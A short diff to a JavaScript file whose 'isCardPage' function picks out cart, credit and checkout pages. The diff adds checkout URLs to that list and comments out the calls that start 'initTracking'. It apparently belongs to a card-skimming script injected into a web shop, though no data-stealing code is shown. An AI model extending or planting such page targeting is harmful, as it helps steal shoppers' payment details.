@@ -105,7 +105,7 @@ const payload = {
         return '';
     }
         function isCardPage() {
-            const cardPageUrls = ['/cart', '/add-credit']; 
+            const cardPageUrls = ['/cart', '/add-credit','/checkout/cart','/checkout/confirm/address']; 
             return cardPageUrls.some(url => window.location.pathname.includes(url));
         }
         
@@ -116,9 +116,9 @@ const payload = {
         }
 
         // setTimeout(initTracking, 2000);
-        initTracking()
+        //initTracking()
     
-    window.addEventListener("DOMContentLoaded", initTracking);
+    //window.addEventListener("DOMContentLoaded", initTracking);
 
 
 })();
